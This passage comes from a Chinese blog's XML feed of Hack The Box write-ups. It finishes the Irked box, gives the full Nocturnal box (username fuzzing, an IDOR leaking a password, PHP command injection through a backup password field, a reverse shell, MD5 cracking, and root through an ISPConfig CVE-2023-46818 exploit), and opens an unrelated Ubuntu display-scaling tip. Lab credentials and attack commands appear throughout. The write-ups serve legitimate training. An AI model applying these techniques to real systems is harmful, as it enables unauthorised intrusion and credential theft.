<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ircd<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ircd<span class="token punctuation">)</span></code></pre>

<h3 id="路径二"><a href="#路径二" class="headerlink" title="路径二"></a>路径二</h3><p>信息收集：在<code>/home/djmardov/Document</code> 下可以找到 <code>.backup</code>文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ircd@irked:/home/djmardov/Documents$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">2</span> djmardov djmardov <span class="token number">4096</span> Sep  <span class="token number">5</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> djmardov djmardov <span class="token number">4096</span> Sep  <span class="token number">5</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
-rw-r--r--  <span class="token number">1</span> djmardov djmardov   <span class="token number">52</span> May <span class="token number">16</span>  <span class="token number">2018</span> .backup
lrwxrwxrwx  <span class="token number">1</span> root     root       <span class="token number">23</span> Sep  <span class="token number">5</span>  <span class="token number">2022</span> user.txt -<span class="token operator">></span> /home/djmardov/user.txt
ircd@irked:/home/djmardov/Documents$ <span class="token function">cat</span> .backup
<span class="token function">cat</span> .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss</code></pre>

<p>访问80端口可以看到，感觉可能是什么隐写术，保存图片并使用steghide提取信息，密码使用<code>.backup</code> 中获取的密码</p>
<img src="/Hackthebox/htb/htb-Irked/image-20250420002023056.png" class="" title="web">

<p>提取出pass.txt， 使用ssh登录成功</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ steghide extract <span class="token parameter variable">-sf</span> irked.jpg 
Enter passphrase: 
wrote extracted data to <span class="token string">"pass.txt"</span><span class="token builtin class-name">.</span>

$ <span class="token function">cat</span> pass.txt  
Kab6h+m+bbp2J:HG

$  <span class="token function">ssh</span> djmardov@10.10.10.117
The authenticity of <span class="token function">host</span> <span class="token string">'10.10.10.117 (10.10.10.117)'</span> can't be established.
ED25519 key fingerprint is SHA256:Ej828KWlDpyEOvOxHAspautgmarzw646NS31tX3puFg.
This key is not known by any other names.
Are you sure you want to <span class="token builtin class-name">continue</span> connecting <span class="token punctuation">(</span>yes/no/<span class="token punctuation">[</span>fingerprint<span class="token punctuation">]</span><span class="token punctuation">)</span>? <span class="token function">yes</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
Last login: Tue May <span class="token number">15</span> 08:56:32 <span class="token number">2018</span> from <span class="token number">10.33</span>.3.3
djmardov@irked:~$ <span class="token function">id</span> 
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>djmardov<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>djmardov<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>djmardov<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,108<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,110<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,113<span class="token punctuation">(</span>scanner<span class="token punctuation">)</span>,117<span class="token punctuation">(</span>bluetooth<span class="token punctuation">)</span></code></pre>

<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>同路径一</p>
<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;djmardov&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>密码重用</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Nocturnal</title>
    <url>/Hackthebox/htb/htb-nocturnal/</url>
    <content><![CDATA[<style>.neymsohdoedy{zoom:50%;}</style><img src="/Hackthebox/htb/htb-nocturnal/f6a56cec6e9826b4ed124fb4155abc66.png" class="neymsohdoedy">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.64 <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> 
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-04-18 <span class="token number">23</span>:42 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.64
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.11s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.12 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> <span class="token number">20</span>:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.18</span>.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">15.09</span> seconds</code></pre>

<p>在80端口存在 web应用，添加域名到本地解析</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.11.64 nocturnal.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>

<h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>访问应用，可以自行注册用户</p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419153519866.png" class="" title="注册">

<p>登录后有个上传功能，只支持pdf、doc、docx、xls、xlsx、odt，上传文件后查看文件url为<code>http://nocturnal.htb/view.php?username=admin123&amp;file=shell.php.pdf</code></p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419154125531.png" class="" title="文件上传">

<h3 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h3><p>使用ffuf Fuzzing 用户名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /opt/secLists/Usernames/Names/names.txt:FUZZ <span class="token parameter variable">-u</span> <span class="token string">'http://nocturnal.htb/view.php?username=FUZZ&amp;file=shell.php.pdf'</span> <span class="token parameter variable">-H</span> <span class="token string">'Cookie: PHPSESSID=dldt7f2eqv1ia7j3dieiq69icu'</span>  <span class="token parameter variable">-fs</span> <span class="token number">2985</span> 


        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://nocturnal.htb/view.php?username<span class="token operator">=</span>FUZZ<span class="token operator">&amp;</span><span class="token assign-left variable">file</span><span class="token operator">=</span>shell.php.pdf
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /opt/secLists/Usernames/Names/names.txt
 :: Header           <span class="token builtin class-name">:</span> Cookie: <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>dldt7f2eqv1ia7j3dieiq69icu
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">40</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
 :: Filter           <span class="token builtin class-name">:</span> Response size: <span class="token number">2985</span>
________________________________________________

admin                   <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">3037</span>, Words: <span class="token number">1174</span>, Lines: <span class="token number">129</span>, Duration: 85ms<span class="token punctuation">]</span>
amanda                  <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">3355</span>, Words: <span class="token number">1178</span>, Lines: <span class="token number">129</span>, Duration: 84ms<span class="token punctuation">]</span>
tobias                  <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">3037</span>, Words: <span class="token number">1174</span>, Lines: <span class="token number">129</span>, Duration: 86ms<span class="token punctuation">]</span>
:: Progress: <span class="token punctuation">[</span><span class="token number">10177</span>/10177<span class="token punctuation">]</span> :: Job <span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> :: <span class="token number">452</span> req/sec :: Duration: <span class="token punctuation">[</span><span class="token number">0</span>:00:22<span class="token punctuation">]</span> :: Errors: <span class="token number">0</span> ::
</code></pre>

<h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><p>访问fuzz出的用户名，在amanda账户下可以看到privacy.odt</p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419161728361.png" class="" title="越权">

<p>下载并使用LibreOffice 打开可以找到密码</p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419161912039.png" class="" title="odt">

<p>使用amanda 登录，可以跳转到admin pannel，有备份功能</p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419162240539.png" class="" title="管理页面">

<p>下载备份文件</p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419162632127.png" class="" title="备份">

<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>在admin.php中创建备份设置密码参数直接拼接进命令中，所以存在命令注入</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;...&gt;
&lt;?php
if (isset($_POST[&#39;backup&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) &#123;
    $password &#x3D; cleanEntry($_POST[&#39;password&#39;]);
    $backupFile &#x3D; &quot;backups&#x2F;backup_&quot; . date(&#39;Y-m-d&#39;) . &quot;.zip&quot;;

    if ($password &#x3D;&#x3D;&#x3D; false) &#123;
        echo &quot;&lt;div class&#x3D;&#39;error-message&#39;&gt;Error: Try another password.&lt;&#x2F;div&gt;&quot;;
    &#125; else &#123;
        $logFile &#x3D; &#39;&#x2F;tmp&#x2F;backup_&#39; . uniqid() . &#39;.log&#39;;
       
        $command &#x3D; &quot;zip -x &#39;.&#x2F;backups&#x2F;*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;;
        
        $descriptor_spec &#x3D; [
            0 &#x3D;&gt; [&quot;pipe&quot;, &quot;r&quot;], &#x2F;&#x2F; stdin
            1 &#x3D;&gt; [&quot;file&quot;, $logFile, &quot;w&quot;], &#x2F;&#x2F; stdout
            2 &#x3D;&gt; [&quot;file&quot;, $logFile, &quot;w&quot;], &#x2F;&#x2F; stderr
        ];

        $process &#x3D; proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) &#123;
            proc_close($process);
        &#125;
&lt;...&gt;</code></pre>

<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>可以看到执行id命令成功</p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419170350593.png" class="" title="burp">

<p>下载反弹shell的脚本</p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419211424366.png" class="" title="burp">

<p>执行脚本</p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419211229272.png" class="" title="burp">

<p>成功接收到shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9001</span>                          
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
Connection received on <span class="token number">10.10</span>.11.64 <span class="token number">40554</span>
/bin/sh: <span class="token number">0</span>: can't access <span class="token function">tty</span><span class="token punctuation">;</span> job control turned off
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在&#x2F;var&#x2F;www 目录下可以找到ispconfig文件和nocturnal_database.db并且存在密码hash，在home目录下存在用户tobias</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">pwd</span>
/var/www/nocturnal.htb
$ <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>
$ <span class="token function">ls</span>
html
ispconfig
nocturnal.htb
nocturnal_database
php-fcgi-scripts
$ strings nocturnal_database.db 
SQLite <span class="token function">format</span> <span class="token number">3</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
indexsqlite_autoindex_users_1users
Mtestrefe8de352cd483af54ec60595508e54e,	
Madmin123e6e061838856bf47e1de730719fb2609<span class="token punctuation">(</span>
Mtest098f6bcd4621d373cade4e832627b4f6<span class="token punctuation">)</span>
Me0Al5101ad4543a96a7fd84908fd0d802e7db<span class="token punctuation">(</span>
Mkavif38cde1654b39fea2bd4f72f1ae4cdda*
Mtobias55c82b1ccd55ab219b3b109b07d5061d*
Mamandadf8b20aa0c935023f99ea58358fb63c4<span class="token punctuation">)</span>
Madmind725aeba143f575736b07e045d8ceebb
testr
admin123	
<span class="token builtin class-name">test</span>
e0Al5
kavi
tobias
amanda
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
$ <span class="token function">ls</span> /home
tobias
</code></pre>

<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>使用hashcat 破解密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashcat <span class="token builtin class-name">hash</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">0</span>  /opt/secLists/rockyou.txt    
hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting

<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
Dictionary cache built:
* Filename<span class="token punctuation">..</span>: /opt/secLists/rockyou.txt
* Passwords.: <span class="token number">14344391</span>
* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139921497</span>
* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344384</span>
* Runtime<span class="token punctuation">..</span>.: <span class="token number">0</span> secs

55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse     
                                                          
Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">0</span> <span class="token punctuation">(</span>MD5<span class="token punctuation">)</span>
Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: 55c82b1ccd55ab219b3b109b07d5061d
Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Sat Apr <span class="token number">19</span> <span class="token number">21</span>:41:24 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">1</span> sec<span class="token punctuation">)</span>
Time.Estimated<span class="token punctuation">..</span>.: Sat Apr <span class="token number">19</span> <span class="token number">21</span>:41:25 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span>/opt/secLists/rockyou.txt<span class="token punctuation">)</span>
Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
Speed.<span class="token comment">#1.........: 14555.5 kH/s (0.17ms) @ Accel:1024 Loops:1 Thr:1 Vec:16</span>
Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">3702784</span>/14344384 <span class="token punctuation">(</span><span class="token number">25.81</span>%<span class="token punctuation">)</span>
Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/3702784 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">3686400</span>/14344384 <span class="token punctuation">(</span><span class="token number">25.70</span>%<span class="token punctuation">)</span>
Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span>
Candidate.Engine.: Device Generator
Candidates.<span class="token comment">#1....: smartpimps -> slaton01</span>
Hardware.Mon.<span class="token comment">#1..: Temp: 62c Util:  6%</span>

Started: Sat Apr <span class="token number">19</span> <span class="token number">21</span>:41:09 <span class="token number">2025</span>
Stopped: Sat Apr <span class="token number">19</span> <span class="token number">21</span>:41:25 <span class="token number">2025</span>
</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用破解出的密码登录ssh，可以找到ispconfig服务运行在8080</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> tobias@nocturnal.htb                                                                                                                              
tobias@nocturnal.htb's password: 
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
Last login: Sat Apr <span class="token number">19</span> <span class="token number">13</span>:24:43 <span class="token number">2025</span> from <span class="token number">10.10</span>.16.24
tobias@nocturnal:~$ <span class="token function">whoami</span>
tobias
tobias@nocturnal:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>tobias<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>tobias<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>tobias<span class="token punctuation">)</span>
tobias@nocturnal:/var/www$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
total <span class="token number">24</span>
drwxr-xr-x  <span class="token number">6</span> ispconfig ispconfig <span class="token number">4096</span> Apr <span class="token number">14</span> 09:26 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">14</span> root      root      <span class="token number">4096</span> Oct <span class="token number">18</span>  <span class="token number">2024</span> <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">2</span> root      root      <span class="token number">4096</span> Mar  <span class="token number">4</span> <span class="token number">15</span>:02 html
lrwxrwxrwx  <span class="token number">1</span> root      root        <span class="token number">34</span> Oct <span class="token number">17</span>  <span class="token number">2024</span> ispconfig -<span class="token operator">></span> /usr/local/ispconfig/interface/web
drwxr-xr-x  <span class="token number">2</span> www-data  www-data  <span class="token number">4096</span> Apr <span class="token number">19</span> 09:22 nocturnal_database
drwxr-xr-x  <span class="token number">4</span> www-data  www-data  <span class="token number">4096</span> Apr <span class="token number">19</span> <span class="token number">13</span>:20 nocturnal.htb
drwxr-xr-x  <span class="token number">4</span> ispconfig ispconfig <span class="token number">4096</span> Oct <span class="token number">17</span>  <span class="token number">2024</span> php-fcgi-scripts
tobias@nocturnal:/var/www$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> tobias: 
Sorry, user tobias may not run <span class="token function">sudo</span> on nocturnal.
tobias@nocturnal:/var/www$ ss <span class="token parameter variable">-aunt</span>
Netid           State            Recv-Q           Send-Q                     Local Address:Port                      Peer Address:Port           Process           
udp             UNCONN           <span class="token number">0</span>                <span class="token number">0</span>                          <span class="token number">127.0</span>.0.53%lo:53                             <span class="token number">0.0</span>.0.0:*                                
tcp             LISTEN           <span class="token number">0</span>                <span class="token number">10</span>                             <span class="token number">127.0</span>.0.1:25                             <span class="token number">0.0</span>.0.0:*                                
tcp             LISTEN           <span class="token number">0</span>                <span class="token number">70</span>                             <span class="token number">127.0</span>.0.1:33060                          <span class="token number">0.0</span>.0.0:*                                
tcp             LISTEN           <span class="token number">0</span>                <span class="token number">151</span>                            <span class="token number">127.0</span>.0.1:3306                           <span class="token number">0.0</span>.0.0:*                                
tcp             LISTEN           <span class="token number">0</span>                <span class="token number">10</span>                             <span class="token number">127.0</span>.0.1:587                            <span class="token number">0.0</span>.0.0:*                                
tcp             LISTEN           <span class="token number">0</span>                <span class="token number">4096</span>                           <span class="token number">127.0</span>.0.1:8080                           <span class="token number">0.0</span>.0.0:*                                
tcp             LISTEN           <span class="token number">0</span>                <span class="token number">511</span>                              <span class="token number">0.0</span>.0.0:80                             <span class="token number">0.0</span>.0.0:*                                
tcp             LISTEN           <span class="token number">0</span>                <span class="token number">4096</span>                       <span class="token number">127.0</span>.0.53%lo:53                             <span class="token number">0.0</span>.0.0:*                                
tcp             LISTEN           <span class="token number">0</span>                <span class="token number">128</span>                              <span class="token number">0.0</span>.0.0:22                             <span class="token number">0.0</span>.0.0:*                                
tcp             ESTAB            <span class="token number">0</span>                <span class="token number">36</span>                           <span class="token number">10.10</span>.11.64:22                         <span class="token number">10.10</span>.16.24:41832                            
tcp             ESTAB            <span class="token number">0</span>                <span class="token number">0</span>                            <span class="token number">10.10</span>.11.64:40554                      <span class="token number">10.10</span>.16.24:9001                             
tcp             LISTEN           <span class="token number">0</span>                <span class="token number">128</span>                                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22                                <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*            </code></pre>

<p>使用ssh 进行本地端口转发<code>ssh tobias@nocturnal.htb -L 8081:127.0.0.1:8080</code></p>
<p>访问本地8081端口，可以看到ispconfig</p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419214933108.png" class="" title="ispconfig">

<p>使用admin和破解出的密码的登录，登录成功，找到版本号为3.2.10p1</p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419215703693.png" class="" title="ispconfig">

<p>搜索exp，找到CVE-2023-46818，在github检索利用脚本</p>
<img src="/Hackthebox/htb/htb-nocturnal/image-20250419220423834.png" class="" title="exp">



<img src="/Hackthebox/htb/htb-nocturnal/image-20250419220537140.png" class="" title="github">



<p>提权成功</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 exploit.py http://127.0.0.1:8081 admin slowmotionapocalypse
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Target URL: http://127.0.0.1:8081/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Logging <span class="token keyword">in</span> with username <span class="token string">'admin'</span> and password <span class="token string">'slowmotionapocalypse'</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Injecting shell
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Launching shell

ispconfig-shell<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>

ispconfig-shell<span class="token comment"># cat /root/root.txt</span></code></pre>

<table>
<thead>
<tr>
<th>Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td>&#x2F;home&#x2F;tobias&#x2F;user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>密码重用</tag>
        <tag>CVE</tag>
        <tag>越权</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 24.04 应用、字体及截图模糊解决方案</title>
    <url>/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%962/</url>
    <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>Ubuntu 24.04 默认使用Wayland 作为窗口管理器，当 GNOME 桌面设置分数倍缩放后，截图和一些应用会变得模糊，如vscode、Pycharm、typra ，截图更是难崩</p>
<span id="more"></span>

<img src="/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%962/image-20250416234351672.png" class="">

<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>方法有两个：</p>
<h4 id="1-使用X11-替换Wayland"><a href="#1-使用X11-替换Wayland" class="headerlink" title="1. 使用X11 替换Wayland"></a>1. 使用X11 替换Wayland</h4><p>修改<code>/etc/gdm3/custom.conf</code> 将 <code>WaylandEnable=false</code>  前面的注释去掉，然后<code>sudo systemctl restart gdm3 </code>重启服务</p>
